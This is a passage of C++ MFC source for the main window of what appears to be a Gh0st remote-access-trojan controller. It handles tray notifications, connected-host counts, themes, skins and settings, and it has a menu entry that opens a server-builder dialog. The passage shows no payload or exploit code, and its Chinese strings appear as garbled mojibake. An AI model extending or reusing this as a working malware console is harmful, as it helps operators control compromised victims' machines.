//		m_TrayIcon.ShowBalloonTip( _T("123"), _T(Bt_szName), NIIF_NONE, 5);

	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}

}

LRESULT CMainFrame::OnSystray(WPARAM wParam,LPARAM lParam)
{
	UINT uMouseMsg;//��궯��
	uMouseMsg=(UINT)lParam;
	if(uMouseMsg==WM_LBUTTONDOWN)//����ǵ������
	{
		AfxGetMainWnd()->SetForegroundWindow(); 
		OnShow();
		AfxGetMainWnd()->PostMessage(WM_NULL,0,0);
	}
	if(uMouseMsg==WM_RBUTTONDOWN)
	{
		AfxGetMainWnd()->SetForegroundWindow(); 

		CMenu menu;//����Popup�˵�
		menu.LoadMenu(IDR_MINIMIZE);
		CMenu* pPopup=menu.GetSubMenu(0);
//		pPopup->SetDefaultItem(IDM_SHOW);

		CString stro;
		BOOL a_chkm = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("����", "poptips", false);
	    if(!a_chkm)
		    stro = "�ر���Ϣ��ʾ";
	    else
		    stro = "������Ϣ��ʾ";
		pPopup->ModifyMenu(0,MF_BYPOSITION | MF_STRING|MF_POPUP,IDM_NEWSTIPS, stro);

		a_chkm = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("����", "Alarm", false);
	    if(a_chkm)
		    stro = "�ر�������ʾ";
	    else
		    stro = "����������ʾ";
		pPopup->ModifyMenu(1,MF_BYPOSITION | MF_STRING|MF_POPUP,IDM_VOICEPROMPT, stro);

		CPoint Point;
		GetCursorPos(&Point);
		pPopup->TrackPopupMenu(TPM_LEFTALIGN,
			Point.x,Point.y,AfxGetMainWnd(),NULL);
		AfxGetMainWnd()->PostMessage(WM_NULL,0,0);
	}
	return NULL;
}

void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
{
	// TODO: Add your message handler code here and/or call default
	pCmdUI->Enable();
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str,strTemp;
	int a = 0;
	CPcView* pView = NULL;
	int count = g_pTabView->m_wndTabControl.GetItemCount();
	for (int i = 0; i < count; i++)
	{	
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
		a += pView->m_pListCtrl->GetItemCount();
	}
	str.Format("��������: %d", a);
	m_wndStatusBar.SetPaneText(3, str);
	Zjshulian=a;
}

void CMainFrame::OnShow() 
{
	// TODO: Add your command handler code here

	MinTray=NULL;  //������ʾ״̬
	IOCTrat=NULL;  //�رն�ʱ�� 
	m_TrayIcon.RemoveIcon();
	m_TrayIcon.MaximizeFromTray(this);

}

void CMainFrame::OnExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{	
	m_TrayIcon.ShowBalloonTip( lpszText, _T(Bt_szName), NIIF_NONE, 5);
}

void CMainFrame::SetTheme(int iTheme)
{
	m_iTheme = iTheme;
	XTThemeManager()->SetTheme((XTThemeStyle)m_iTheme);
	XTPPaintManager()->SetTheme((XTPPaintTheme)m_iTheme);
	
	RedrawWindow( NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW | RDW_ERASE | RDW_ALLCHILDREN );
	
	RecalcLayout();
}


BOOL CMainFrame::OnEraseBkgnd(CDC* /*pDC*/) 
{
	// TODO: Add your message handler code here and/or call default
	return TRUE;
}

void CMainFrame::OnSettings() 
{
	// TODO: Add your command handler code here
	CSettingDlg dlg;
	dlg.DoModal();
}

void CMainFrame::OnBuild() 
{
	// TODO: Add your command handler code here
	BuildServer dlg;
	dlg.DoModal();
}

CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
{
	int nID = ++m_nCount;
	
	CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);
	
	CString strTitle;
	strTitle.Format(strFormat, nID);
	pwndPane->SetTitle(strTitle);
	pwndPane->SetIconID(nID % 6 + 1);
	
	CFrameWnd* pFrame = new CFrameWnd;
	
	CCreateContext context;
	context.m_pNewViewClass = pNewViewClass;
	context.m_pCurrentDoc = GetActiveView()->GetDocument();
	
	pFrame->Create(NULL, NULL, WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, NULL, 0, &context);
	pFrame->ModifyStyleEx(WS_EX_CLIENTEDGE, 0);
	
	m_mapPanes.SetAt(nID, pFrame);
	
	return pwndPane;
}

LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
	if (wParam == XTP_DPN_SHOWWINDOW)
	{
		// get a pointer to the docking pane being shown.
		CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
		if (!pPane->IsValid())
		{
			CWnd* pWnd = NULL;
			if (m_mapPanes.Lookup(pPane->GetID(), pWnd))
			{
				pPane->Attach(pWnd);
			}
		}
		
		return TRUE; // handled
	}

	return FALSE;
}

void CMainFrame::OnAppExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}

void CMainFrame::OnCustomize()
{

}

void CMainFrame::OnUpdateOptionsStyle(CCmdUI* pCmdUI)
{
	pCmdUI->SetCheck(pCmdUI->m_nID == m_nRibbonStyle ? 1 : 0);

}

void CMainFrame::OnFrameTheme()
{
	ShowWindow(SW_NORMAL);
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);

	CXTPWindowRect rc(this);
	rc.top += (pRibbonBar->IsFrameThemeEnabled() ? -1 : +1) * GetSystemMetrics(SM_CYCAPTION);
	MoveWindow(rc);
	
	pRibbonBar->EnableFrameTheme(!pRibbonBar->IsFrameThemeEnabled());

}

void CMainFrame::OnUpdateFrameTheme(CCmdUI* pCmdUI)
{
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);

	pCmdUI->SetCheck(pRibbonBar->IsFrameThemeEnabled() ? TRUE : FALSE);
}

void CMainFrame::OnTools() 
{
	// TODO: Add your command handler code here
	CMyToolsKit dlg;
	dlg.DoModal();
}

void CMainFrame::OnAddSkin()// ������ԴƤ��
{

	HGLOBAL hRes;
	HRSRC hResInfo;
	HINSTANCE hinst = AfxGetInstanceHandle();
	hResInfo = FindResource( hinst, MAKEINTRESOURCE(IDR_SKIN), "SKIN" );
	if (hResInfo != NULL)
	{
		hRes = LoadResource( hinst, hResInfo);
		if (hRes != NULL)
		{
			SkinH_Attach();
			SkinH_AttachRes( (LPBYTE)hRes, SizeofResource(hinst,hResInfo), NULL, NULL, NULL, NULL );
//			SkinH_AttachEx(("Control/SkinH.she"), NULL);
//			SkinH_SetAero(TRUE);
//			FreeResource(hRes);
//			SkinH_SetMenuAlpha(170);
//			SkinH_AdjustHSV(0,-100,0);
		}
	}

}

/*
void CMainFrame::OnAddSkin()// ������ԴƤ��
{
    static TCHAR szAppName[] = TEXT ("About1") ;
     MSG          msg ;
     HWND         hwnd ;
     WNDCLASS     wndclass ;
  
     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = 0;//hInstance ;
     wndclass.hIcon         = 0;//LoadIcon (hInstance, szAppName) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = szAppName ;
     wndclass.lpszClassName = szAppName ;
     
     if (!RegisterClass (&wndclass))
     {
          MessageBox (TEXT ("This program requires Windows NT!"),
                      szAppName, MB_ICONERROR) ;
          return ;
     }

     	SkinH_AttachEx(("skins/MSN.she"), NULL); 
     hwnd = CreateWindow (szAppName, TEXT ("About Box Demo Program"),
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, 0, NULL) ;
     
     ::ShowWindow (hwnd,SW_SHOW) ;
     ::UpdateWindow (hwnd) ; 

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }

}
*/


void CMainFrame::OnTimerspop(BOOL Tstx,CString ToolTipsText)
{
	ToolTipsTextsp=ToolTipsText;
	if((MinTray==NULL)|(Tstx==TRUE))  //����ͼ��
	{
		IOCTrat=NULL;
	}
	else  //����ͼ����˸
	{
//		wsprintf(m_NotifyIcon.szTip,"��������-->\n%s\n��ǰ��������: %d̨",ToolTipsText,Zjshulian);   //
		IOCTrat=TRUE;
	}

	OnTimerschushi(); //ˢ��������ֵ��ʾ
}

void CMainFrame::OnTimerschushi() //ˢ��������ֵ��ʾ
{
	//��ʼ����¼ֵ
    m_nCurrent = 0;
	SetTimer(1, 500, NULL);  //����ͼ����˸��ʱ�� 1
}

void CMainFrame::OnTimer(UINT nIDEvent)
{
	// TODO: Add your message handler code here and/or call default
	if(nIDEvent == 1)
	{
		m_NotifyIcon.cbSize = sizeof(NOTIFYICONDATA);
		m_NotifyIcon.hWnd = this->GetSafeHwnd();
		m_NotifyIcon.uID = IDR_MAINFRAME;
		m_NotifyIcon.uFlags = NIF_ICON |NIF_TIP |NIF_MESSAGE;
		m_NotifyIcon.uCallbackMessage = WM_ICONMESSAGE;

		if(IOCTrat==TRUE)  //ͼ����˸����
		{
			wsprintf(m_NotifyIcon.szTip,"��������-->\n%s\n��������: %d̨",ToolTipsTextsp,Zjshulian);   //
		    if(m_nCurrent == 0)
			{
			    m_NotifyIcon.hIcon = m_hEmptyIcon;
			    m_nCurrent = 1;
			}
		    else
			{
			    m_NotifyIcon.hIcon = m_hDrawIcon;
			    m_nCurrent = 0;
			}
		}
		else
		{
	        CString Lineips = Onlinetips();
	        CString Lineips1 = OnVoicepromptsm();
	        wsprintf(m_NotifyIcon.szTip,"��������: %d̨\n����: %s\n��Ϣ��ʾ: %s",Zjshulian,Lineips1,Lineips);
			m_NotifyIcon.hIcon = m_hDrawIcon;
			KillTimer(1);  //�رն�ʱ�� 1
		}
		Shell_NotifyIcon(NIM_MODIFY,&m_NotifyIcon);
	}

	CXTPFrameWnd::OnTimer(nIDEvent);
}

void CMainFrame::OnNewstips() 
{
    BOOL Popt = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("����", "PopTips", false);
	if(Popt)
		Popt = NULL;
	else
		Popt = TRUE;
    ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("����", "poptips", Popt);

	g_pFrame->IOCTrat=NULL;
	g_pFrame->OnTimerschushi(); //ˢ��������ֵ��ʾ
}

void CMainFrame::OnVoiceprompt() 
{
    BOOL Popt = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("����", "Alarm", false);
	if(Popt)
		Popt = NULL;
	else
		Popt = TRUE;
    ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("����", "Alarm", Popt);

	g_pFrame->IOCTrat=NULL;
	g_pFrame->OnTimerschushi(); //ˢ��������ֵ��ʾ
	
}

